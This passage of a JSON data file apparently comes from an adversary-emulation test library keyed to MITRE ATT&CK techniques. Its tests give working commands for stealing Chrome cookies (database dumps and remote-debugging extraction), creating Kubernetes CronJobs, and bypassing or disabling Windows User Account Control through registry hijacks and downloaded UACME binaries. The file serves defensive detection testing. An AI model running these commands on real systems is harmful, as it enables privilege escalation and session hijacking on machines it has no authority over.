"type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"}, "output_file": {"description": "Filepath to output cookies", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sqlite3 must exist at (#{sqlite3_path})\n", "prereq_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force\n"}], "executor": {"command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue\n\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c #{sqlite3_path} \"#{cookie_db}\" | out-file -filepath \"#{output_file}\"\n", "cleanup_command": "remove-item #{output_file}\n", "name": "powershell", "elevation_required": false}}, {"name": "Steal Chrome Cookies via Remote Debugging (Mac)", "auto_generated_guid": "e43cfdaf-3fb8-4a45-8de0-7eee8741d072", "description": "The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.\n\nIf successful, this test will output a list of cookies.\n\nNote: Chrome processes will be killed during this test.\n\nSee https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e", "supported_platforms": ["macos"], "dependency_executor_name": "bash", "dependencies": [{"description": "Install Go", "prereq_command": "go version", "get_prereq_command": "brew install go"}, {"description": "Download and compile WhiteChocolateMacademiaNut", "prereq_command": "/tmp/WhiteChocolateMacademiaNut/chocolate -h", "get_prereq_command": "git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut\ncd /tmp/WhiteChocolateMacademiaNut\ngo mod init chocolate\ngo mod tidy\ngo build"}], "executor": {"command": "killall 'Google Chrome'\nsleep 1\nopen -a \"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/\nsleep 1\n/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337", "cleanup_command": "rm -rf /tmp/WhiteChocolateMacademiaNut", "name": "bash", "elevation_required": false}}]}, "T1053.007": {"name": "Container Orchestration Job", "technique_id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096", "external_id": "T1053.007", "data_components": ["Container Creation", "Scheduled Job Creation", "File Creation"], "kill_chain_phases": ["execution", "persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f"], "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)", "atomic_tests": [{"name": "ListCronjobs", "auto_generated_guid": "ddfb0bc1-3c3f-47e9-a298-550ecfefacbd", "description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n", "supported_platforms": ["containers"], "input_arguments": {"namespace": {"description": "K8s namespace to list", "type": "string", "default": "default"}}, "dependencies": [{"description": "kubectl must be installed\n", "get_prereq_command": "echo \"kubectl must be installed manually\"\n", "prereq_command": "which kubectl\n"}], "executor": {"command": "kubectl get cronjobs -n #{namespace}\n", "name": "bash", "elevation_required": false}}, {"name": "CreateCronjob", "auto_generated_guid": "f2fa019e-fb2a-4d28-9dc6-fd1a9b7f68c3", "description": "Kubernetes Job is a controller that creates one or more pods and ensures that a specified number of them successfully terminate. Kubernetes Job can be used to run containers that perform finite tasks for batch jobs. Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes CronJob for scheduling execution of malicious code that would run as a container in the cluster.\n", "supported_platforms": ["containers"], "input_arguments": {"namespace": {"description": "K8s namespace to list", "type": "string", "default": "default"}}, "dependencies": [{"description": "kubectl must be installed\n", "get_prereq_command": "echo \"kubectl must be installed manually\"\n", "prereq_command": "which kubectl\n"}], "executor": {"command": "kubectl create -f src/cronjob.yaml -n #{namespace}\n", "cleanup_command": "kubectl delete cronjob art -n #{namespace}\n", "name": "bash", "elevation_required": false}}]}, "T1548.002": {"name": "Bypass User Account Control", "technique_id": "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073", "external_id": "T1548.002", "data_components": ["Process Creation", "Command Execution", "Windows Registry Key Modification", "Process Metadata"], "kill_chain_phases": ["privilege-escalation", "defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--2c2ad92a-d710-41ab-a996-1db143bb4808", "course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8", "course-of-action--e5d930e9-775a-40ad-9bdb-b941d8dfe86b"], "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)", "atomic_tests": [{"name": "Bypass UAC using Event Viewer (cmd)", "auto_generated_guid": "5073adf8-9a50-4bd9-b298-a9bd2ead8af9", "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc\n", "cleanup_command": "reg.exe delete hkcu\\software\\classes\\mscfile /f >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Bypass UAC using Event Viewer (PowerShell)", "auto_generated_guid": "a6ce9acf-842a-4af6-8f79-539be7608e2b", "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n", "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Bypass UAC using Fodhelper", "auto_generated_guid": "58f641ea-12e3-499a-b684-44dee46bd182", "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n", "cleanup_command": "reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1\n", "name": "command_prompt"}}, {"name": "Bypass UAC using Fodhelper - PowerShell", "auto_generated_guid": "3f627297-6c38-4e7d-a278-fc2563eaaeaa", "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n", "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Bypass UAC using ComputerDefaults (PowerShell)", "auto_generated_guid": "3c51abf2-44bf-42d8-9111-dc96ff66750f", "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n", "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Bypass UAC by Mocking Trusted Directories", "auto_generated_guid": "f7a35090-6f7f-4f64-bb47-d657bf5b10c1", "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n", "supported_platforms": ["windows"], "input_arguments": {"executable_binary": {"description": "Binary to execute with UAC Bypass", "type": "path", "default": "C:\\Windows\\System32\\cmd.exe"}}, "executor": {"command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n", "cleanup_command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q >nul 2>nul\ndel \"c:\\testbypass.exe\" >nul 2>nul\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Bypass UAC using sdclt DelegateExecute", "auto_generated_guid": "3be891eb-4608-4173-87e8-78b494c029b7", "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n", "supported_platforms": ["windows"], "input_arguments": {"command_to_execute": {"description": "Command to execute", "type": "string", "default": "cmd.exe /c notepad.exe"}}, "executor": {"command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value '#{command_to_execute}'\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\nStart-Sleep -s 3\n", "cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Classes\\Folder\" -Recurse -Force -ErrorAction Ignore\n", "name": "powershell"}}, {"name": "Disable UAC using reg.exe", "auto_generated_guid": "9e8af564-53ec-407e-aaa8-3cb20c3af7f9", "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n", "supported_platforms": ["windows"], "executor": {"command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n", "cleanup_command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Bypass UAC using SilentCleanup task", "auto_generated_guid": "28104f8a-4ff1-4582-bcf6-699dce156608", "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n", "supported_platforms": ["windows"], "input_arguments": {"file_path": {"description": "Path to the bat file", "type": "string", "default": "PathToAtomicsFolder\\T1548.002\\src\\T1548.002.bat"}}, "executor": {"command": "\"#{file_path}\"\n", "name": "command_prompt", "elevation_required": false}}, {"name": "UACME Bypass Method 23", "auto_generated_guid": "8ceab7a2-563a-47d2-b5ba-0995211128d7", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n", "supported_platforms": ["windows"], "input_arguments": {"uacme_exe": {"description": "Path to uacme executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n", "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"}], "executor": {"command": "\"#{uacme_exe}\"\n", "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n", "name": "command_prompt"}}, {"name": "UACME Bypass Method 31", "auto_generated_guid": "b0f76240-9f33-4d34-90e8-3a7d501beb15", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n", "supported_platforms": ["windows"], "input_arguments": {"uacme_exe": {"description": "Path to uacme executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\31 Akagi64.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n", "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"}], "executor": {"command": "\"#{uacme_exe}\"\n", "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n", "name": "command_prompt"}}, {"name": "UACME Bypass Method 33", "auto_generated_guid": "e514bb03-f71c-4b22-9092-9f961ec6fb03", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n", "supported_platforms": ["windows"], "input_arguments": {"uacme_exe": {"description": "Path to uacme executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\33 Akagi64.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n", "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"}], "executor": {"command": "\"#{uacme_exe}\"\n", "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n", "name": "command_prompt"}}, {"name": "UACME Bypass Method 34", "auto_generated_guid": "695b2dac-423e-448e-b6ef-5b88e93011d6", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n", "supported_platforms": ["windows"], "input_arguments": {"uacme_exe": {"description": "Path to uacme executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\34 Akagi64.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n", "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"}], "executor": {"command": "\"#{uacme_exe}\"\n", "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n", "name": "command_prompt"}}, {"name": "UACME Bypass Method 39", "auto_generated_guid": "56163687-081f-47da-bb9c-7b231c5585cf", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n", "supported_platforms": ["windows"], "input_arguments": {"uacme_exe": {"description": "Path to uacme executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n", "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"}], "executor": {"command": "\"#{uacme_exe}\"\n", "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n", "name": "command_prompt"}}, {"name": "UACME Bypass Method 56", "auto_generated_guid": "235ec031-cd2d-465d-a7ae-68bab281e80e", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n", "supported_platforms": ["windows"], "input_arguments": {"uacme_exe": {"description": "Path to uacme executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n", "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"}], "executor": {"command": "\"#{uacme_exe}\"\n", "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n", "name": "command_prompt"}}, {"name": "UACME Bypass Method 59", "auto_generated_guid": "dfb1b667-4bb8-4a63-a85e-29936ea75f29", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n", "supported_platforms": ["windows"], "input_arguments": {"uacme_exe": {"description": "Path to uacme executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\59 Akagi64.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n", "prereq_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"}], "executor": {"command": "\"#{uacme_exe}\"\n", "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n", "name": "command_prompt"}}, {"name": "UACME Bypass Method 61", "auto_generated_guid": "7825b576-744c-4555-856d-caf3460dc236", "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n", "supported_platforms": ["windows"], "input_arguments": {"uacme_exe": {"description": "Path to uacme executable", "type": "path", "default": 